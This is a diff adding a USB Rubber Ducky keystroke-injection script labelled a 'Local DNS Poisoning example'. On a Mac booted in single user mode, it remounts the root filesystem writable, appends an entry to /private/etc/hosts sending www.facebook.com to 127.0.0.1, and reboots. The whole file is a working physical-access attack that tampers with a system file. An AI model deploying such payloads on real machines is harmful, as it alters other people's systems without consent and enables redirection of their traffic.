@@ -1,0 +1,14 @@
+REM java -jar encode.jar -i script.ducky
+REM Local DNS Poisoning example
+REM
+REM Boot in Single User Mode Cmd+S and plugin USB
+
+DELAY 1000
+STRING mount -uw /
+DELAY 1000
+ENTER
+STRING echo 127.0.0.1 www.facebook.com >> /private/etc/hosts
+DELAY 500
+ENTER 
+STRING reboot
+ENTER  
